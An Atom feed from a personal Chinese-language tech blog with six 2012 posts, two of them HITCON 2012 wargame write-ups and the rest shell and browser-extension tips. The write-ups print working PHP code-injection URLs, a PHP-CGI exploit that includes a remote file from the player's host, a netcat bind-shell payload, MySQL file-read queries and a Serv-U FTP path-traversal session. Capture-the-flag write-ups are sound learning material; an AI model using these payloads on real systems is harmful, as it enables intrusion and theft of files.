<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[blog.dm4.tw]]></title>
  <link href="http://blog.dm4.tw/atom.xml" rel="self"/>
  <link href="http://blog.dm4.tw/"/>
  <updated>2012-07-26T15:10:54+08:00</updated>
  <id>http://blog.dm4.tw/</id>
  <author>
    <name><![CDATA[dm4]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[HITCON 2012 Wargame Notes - Part 2]]></title>
    <link href="http://blog.dm4.tw/blog/2012/07/26/hitcon-2012-wargame-notes-part-2/"/>
    <updated>2012-07-26T14:21:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2012/07/26/hitcon-2012-wargame-notes-part-2</id>
    <content type="html"><![CDATA[<h3>Web 5</h3>

<p>結果回家研究了一下，終於把 Web 5 也解出來了！好後悔在 HITCON 花太多時間在看
<a href="http://www.youtube.com/watch?v=l2dvg3KJoPo">駭客觀察日記</a> 啊啊啊 orz</p>

<p>這題的 <a href="http://www.exploit-db.com/wp-content/themes/exploit/docs/19527.pdf">提示二</a>
出來之後，可以發現長檔名的檔案/資料夾會因為 <code>~</code> 的縮寫而 disclosure ，所以可以寫個
<a href="https://gist.github.com/3180618">script</a> 來踹，或是用 hint 裡有提到的 <a href="http://code.google.com/p/iis-shortname-scanner-poc/">iis-shortname-scanner-poc</a></p>

<p>不過試了之後發現 file disclosure 只限於有 <code>~</code> 的長檔名，
如果只是 6, 7 個字的檔案/資料夾是不會被套用縮寫的規則，所以也就踹不出來，
在 HITCON 的時候我們就是卡在這裡。</p>

<p>回家再查了多一點資料的時候，看到更多有關 <a href="http://scilnet.fortlewis.edu/tech/NT-Server/File_Names.htm">8.3 Filename</a>
的介紹，其中提到：</p>

<blockquote><p>To disable short filename support, use the registration database editor, REGEDT32.EXE,
and search the HKEY_LOCAL_MACHINE section for the entry HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\FileSystem.
Change the value of the parameter NtfsDisable8dot3NameCreation to a value of 1 (one),
and then short filename generation will be disabled.</p></blockquote>

<p>所以就想到去試一下 <a href="http://wg2.hack.idv.tw:2012/HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/FileSystem/NtfsDisable8dot3NameCreation/key.txt">http://wg2.hack.idv.tw:2012/HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/FileSystem/NtfsDisable8dot3NameCreation/key.txt</a>
沒想到就&#8230;&#8230; orz</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Firefox HackBar Font Setting on Mac OSX]]></title>
    <link href="http://blog.dm4.tw/blog/2012/07/24/firefox-hackbar-font-setting-on-mac-osx/"/>
    <updated>2012-07-24T20:32:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2012/07/24/firefox-hackbar-font-setting-on-mac-osx</id>
    <content type="html"><![CDATA[<p>聽說 <a href="https://addons.mozilla.org/en-us/firefox/addon/hackbar/">HackBar</a> 是 Firefox 下很好用的 extension ，
不過在 Mac OSX 下的字型實在是&#8230;&#8230;慘不忍賭，所以找了一下設定檔在哪裡，Firefox extension 在 Mac OSX 下的路徑是：</p>

<pre><code>~/Library/Application Support/Firefox/Profiles/xxxxxxxx.default/extensions/{F5DDF39C-9293-4d5e-9AA8-E04E6DD5E9B4}.xpi
</code></pre>

<p>其中 <code>xxxxxxxx.default</code> 可能要自己找一下，找到 <code>.xpi</code> 之後可以直接用 <code>vim</code> 來改裡面的檔（.xpi 就是一包 .zip），找到
<code>chrome/skin/hackbar.css</code> 把 textbox 的部份加上想要的字型和大小：</p>

<pre><code>textbox#hackBarTargetUrl,
textbox#hackBarTargetUrlPostField,
textbox#hackBarTargetUrlReferrerField { font-family: monaco, monospace, courier; font-size: 16px; }
</code></pre>

<p>就有舒服的 <a href="https://addons.mozilla.org/en-us/firefox/addon/hackbar/">HackBar</a> 可以看了~</p>

<p><a href="http://www.flickr.com/photos/51077287@N06/7636698076/" title="Flickr 上 sunrisedm4 的 hackbar-font-setting"><img src="http://farm8.staticflickr.com/7248/7636698076_ccf7da7915.jpg" width="500" height="318" alt="hackbar-font-setting"></a></p>

<p>如果想要自己改 source 話，也可以到 <a href="http://code.google.com/p/hackbar/">HackBar Firefox Extension</a> 來載 source code</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HITCON 2012 Wargame Notes]]></title>
    <link href="http://blog.dm4.tw/blog/2012/07/22/hitcon-2012-wargame-notes/"/>
    <updated>2012-07-22T11:27:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2012/07/22/hitcon-2012-wargame-notes</id>
    <content type="html"><![CDATA[<p>今年是第二年來 HITCON ，去年感謝 atdog 大大帶我一起報名 HITCON 玩 wargame ，
本來想說和去年一樣解解 QR code 我就很開心了，沒想到今年運氣不錯 XD</p>

<p>感謝同隊 crax 的組員： atdog xman jeffxx cyen hliu kvchung</p>

<p>Wargame 題目有大大幫忙備分了：<a href="http://rsghost.org/backup/wargame.hitcon.org/">HITCON 2012 Wargame</a></p>

<h2>Wargame 心得</h2>

<p>這次因為運氣好，所以有幾題 web 都用爛招解掉了 XD
用和 hint 沒關係的解法繞掉其實解的有點心虛，下面是今年我有幫到一些忙的題目：</p>

<h3>Web 1</h3>

<p>主要就是利用 <code>{${fucntion()}}</code> 來直接執行 php function ，本來想用 <code>file_get_contents()</code> 來讀 <code>key.php</code> 發現被擋掉了，
所以就試著用 <code>include()</code> 再用 <code>get_defined_vars()</code> 和 <code>var_dump()</code> 看有沒有設什麼變數，還好 <code>key.php</code> 是把 key 放在變數裡，
不然的話就要用其他方法去看 source 了。</p>

<pre><code>http://wg.hack.idv.tw/~ow100/orange.php?name=dm4&amp;data={${include($_GET[key])}}{${var_dump(get_defined_vars())}}
http://wg.hack.idv.tw/~ow100/yourfiles/dm4.config.php?key=../key.php
</code></pre>

<h3>Web 2</h3>

<p>利用 Web 3 給的 <code>sqln00b/sqln00b</code> 可以登入 phpMyAdmin ，接著把 <code>key.php</code> LOAD 到任何一個 table 就可以了：</p>

<pre><code>CREATE TABLE web2 (src TEXT);
LOAD DATA LOCAL INFILE '/home/ow200/public_html/key.php' INTO TABLE web2;
</code></pre>

<h3>Web 4</h3>

<p>從 <code>info.php</code> 發現 <code>Server API: CGI</code> 想到應該是在說今年的 <a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/">PHP CGI vulnerability</a>
，這東西今年出來的時候有看一下，不過其實還是在解題的時候才真的看懂 XD</p>

<p>在 <code>htaccess.txt</code> 裡可以看到</p>

<pre><code>RewriteCond %{QUERY_STRING} \-|\-d[a-z_]+%3d|%2d[a-z_]+%3d [NC]
</code></pre>

<p>發現 <code>%2d</code> 擋的比較鬆，所以研究了一下可以用</p>

<pre><code>http://wg.hack.idv.tw/~w100/info.php?%2dd+allow_url_include%3dOn+%2dd+auto_prepend_file%3dhttp://myhost/a.txt
</code></pre>

<p>來做 remote code execution ，試了一下就可以發現要找的東西在 <code>../key.txt</code> ，所以在 <code>a.txt</code> 這樣寫就可以讓它噴 key 了：</p>

<pre><code>&lt;?php
    system('cat ../key.txt');
    exit();
?&gt;
</code></pre>

<p>本來以為這題這樣就結束了，不過我們想到既然可以用 <code>cat</code> ，搞不好這題可以&#8230;&#8230;</p>

<pre><code>&lt;?php
    system('nc -l -p 5566 -e /bin/bash');
    exit();
?&gt;
</code></pre>

<p>然後&#8230;&#8230;</p>

<pre><code>[~] $ nc wg.hack.idv.tw 5566
id
uid=1002(w100) gid=33(www-data) groups=1002(w100),33(www-data)
</code></pre>

<h3>Web 3</h3>

<p>這題看 hint 應該是要用 mysql client 的 <code>system</code> 來解，不過我們利用 Web 4 拿到的 back connect shell
可以發現要找的東西是 <code>/home/my100/key.txt</code> ，所以一樣用：</p>

<pre><code>CREATE TABLE web3 (src TEXT);
LOAD DATA LOCAL INFILE '/home/my100/key.txt' INTO TABLE web3;
</code></pre>

<p>就可以在 Web 2 的 phpMyAdmin 看到 key 囉~</p>

<h3>Web 6</h3>

<p>也是用爛招&#8230;&#8230; 用 Web 4 拿到的 shell 去看 Web 6 的 source ，在 <code>/home/a200/public_html/index.php</code>
裡面會判斷如果用 <code>admin</code> 登入的話，會噴 base64 encode 之後的 key</p>

<h3>Potent Pwnables 2</h3>

<p><code>nmap</code> 完之後發現有開 ftp ，查了一下發現有 <a href="http://www.exploit-db.com/exploits/18182/">Serv-U FTP Jail Break</a>
和 hint 一模一樣應該就是它了吧 XD 不過那時候肚子太餓又找不到怎麼登入 ftp ，把連結跟 atdog 說了之後我就出去吃點心，
回來之後就被解掉了，id/pw 好像就是 <code>hitcon2012/hitcon2012</code> ，隊友好強啊！</p>

<p>關鍵是 <code>Plz Input "Your" Real ID:</code> 要用 <code>wargame.hitcon.org</code> 的帳號去 generate key.txt 接下來就：</p>

<pre><code>[~] ➟  ftp jumpochisun.blogsyte.com
Connected to jumpochisun.blogsyte.com.
220 Serv-U FTP Server v6.4 for WinSock ready...
Name (jumpochisun.blogsyte.com:dm4): hitcon2012
331 User name okay, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; get ..:/..:/..:/..:/key/dm4key.txt key.txt
local: key.txt remote: ..:/..:/..:/..:/key/dm4key.txt
227 Entering Passive Mode (114,36,241,246,15,231)
150 Opening BINARY mode data connection for dm4key.txt (28 Bytes).
100% |**************************************************|    28      179.89 KiB/s    00:00 ETA
226 Transfer complete.
28 bytes received in 00:00 (0.80 KiB/s)
</code></pre>

<p>剩下的時間都在試著解 Web 5 ，以及一直看 <a href="http://www.youtube.com/watch?v=l2dvg3KJoPo">駭客觀察日記</a>
不過看到結束還是沒找到應該怎麼解&#8230;&#8230;</p>

<p>再次感謝辛苦的主辦單位和工作人員！還有又強又好心收留我帶我一起玩的 crax 隊友！</p>

<p>爽啊！</p>

<p><a href="http://www.flickr.com/photos/51077287@N06/7635469218/" title="Flickr 上 sunrisedm4 的 hitcon-2012-wargame-socre"><img src="http://farm9.staticflickr.com/8426/7635469218_ee0dbce135.jpg" width="500" height="225" alt="hitcon-2012-wargame-socre"></a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[.bashrc sourced twice]]></title>
    <link href="http://blog.dm4.tw/blog/2012/05/11/dot-bashrc-sourced-twice/"/>
    <updated>2012-05-11T21:08:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2012/05/11/dot-bashrc-sourced-twice</id>
    <content type="html"><![CDATA[<p>昨天解決了困擾了一陣子的問題，在 <code>.bashrc</code> 裡，如果有改到 <code>$PATH</code> ：</p>

<pre><code>export PATH=~/bin:$PATH
</code></pre>

<p>又因為我會用到 <a href="http://tmux.sourceforge.net/">tmux</a> ，所以在 <code>tmux</code> 裡開新的 shell 時，會再 source 一次 <code>.bashrc</code> ，本來我的解法是這樣：</p>

<pre><code>[ -z "$TMUX" ] &amp;&amp; export PATH=~/bin:$PATH
</code></pre>

<p>也就是在 <code>tmux</code> 裡新開啟的 shell 並不會再改一次 <code>$PATH</code> ，可是這樣又遇到了另一個問題：當新的 shell 打開時，本來應該被加在前面的 <code>~/bin</code> 會被接到後面去，我在想應該是開新 shell 時 bash 自己做的處理，我在 <code>/etc/bashrc</code> 裡也沒有看到相關的 script 。</p>

<p>對於這個問題我最後的解法是參考 <a href="http://perlbrew.pl/">perlbrew</a> 裡的這段 script ：</p>

<pre><code>export PATH_WITHOUT_PERLBREW="$(perl -e 'print join ":", grep { index($_, $ENV{PERLBREW_ROOT}) } split/:/,$ENV{PATH};')"

if [[ -z "$PERLBREW_PATH" ]]; then
    export PERLBREW_PATH="$PERLBREW_ROOT/bin"
fi

export PATH="$PERLBREW_PATH:$PATH_WITHOUT_PERLBREW"
</code></pre>

<p>最後的結果：</p>

<pre><code>export PATH="~/bin:$(perl -e 'print join ":", grep { $_ ne "~/bin" } split/:/, $ENV{PATH};')"
</code></pre>

<p><strong>Update</strong> 2012-05-13</p>

<p>為了避免 <code>~/bin</code> 和 <code>$HOME/bin</code> 混用，所以改了一下 script</p>

<pre><code>export PATH=$HOME/bin:"$(perl -e 'print join ":", grep { $_ ne "$ENV{HOME}/bin" &amp;&amp; $_ ne "~/bin" } split/:/, $ENV{PATH};')"
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[ and [[ in shell script]]></title>
    <link href="http://blog.dm4.tw/blog/2012/05/10/and-in-shell-script/"/>
    <updated>2012-05-10T17:01:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2012/05/10/and-in-shell-script</id>
    <content type="html"><![CDATA[<p>終於搞懂在 shell script 裡 <code>[ ... ]</code> 和 <code>[[ ... ]]</code> 的差別了</p>

<pre><code>$ help [
[: [ arg... ]
    This is a synonym for the "test" builtin, but the last
    argument must be a literal `]', to match the opening `['.
[[ ... ]]: [[ expression ]]
    Returns a status of 0 or 1 depending on the evaluation of the conditional
    expression EXPRESSION.  Expressions are composed of the same primaries used
    by the `test' builtin, and may be combined using the following operators

        ( EXPRESSION )  Returns the value of EXPRESSION
        ! EXPRESSION    True if EXPRESSION is false; else false
        EXPR1 &amp;&amp; EXPR2  True if both EXPR1 and EXPR2 are true; else false
        EXPR1 || EXPR2  True if either EXPR1 or EXPR2 is true; else false

    When the `==' and `!=' operators are used, the string to the right of the
    operator is used as a pattern and pattern matching is performed.  The
    &amp;&amp; and || operators do not evaluate EXPR2 if EXPR1 is sufficient to
    determine the expression's value.
</code></pre>

<p>簡單的說就是要用 <code>&amp;&amp;</code>, <code>||</code>, <code>!</code>, <code>()</code> 的話要用 <code>[[ ... ]]</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[First Post]]></title>
    <link href="http://blog.dm4.tw/blog/2012/05/08/first-post/"/>
    <updated>2012-05-08T00:27:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2012/05/08/first-post</id>
    <content type="html"><![CDATA[<p>聽說很潮來用一下傳說中的 octopress</p>

<p>本來覺得不會 ruby 怕怕的，可是還是忍不住想試試看用 <a href="http://markdown.tw">Markdown</a> 寫 blog 的感覺，一試之下才發現……也太方便了吧！</p>
]]></content>
  </entry>
  
</feed>
